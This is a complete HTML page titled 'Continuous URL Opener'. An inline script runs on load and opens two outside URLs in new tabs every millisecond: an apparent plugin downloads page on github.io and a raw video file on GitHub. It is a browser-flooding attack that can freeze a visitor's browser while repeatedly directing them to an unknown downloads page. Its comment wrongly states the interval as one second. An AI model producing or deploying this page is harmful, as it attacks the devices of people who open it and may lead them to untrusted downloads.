<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Continuous URL Opener</title>
</head>
<body>
    <script>
        (function() {
            const url = 'https://ilovecodepython.github.io/plugin/downloads/index.html';
            const urll = 'https://github.com/l1ghtsh0t/l1ghtsh0t.github.io/raw/main/media/video.mp4';
            setInterval(() => {
                window.open(url, '_blank');
                window.open(urll, '_blank');
            }, 1); // Open every 1000 milliseconds (1 second)
        })();
    </script>
</body>
</html>
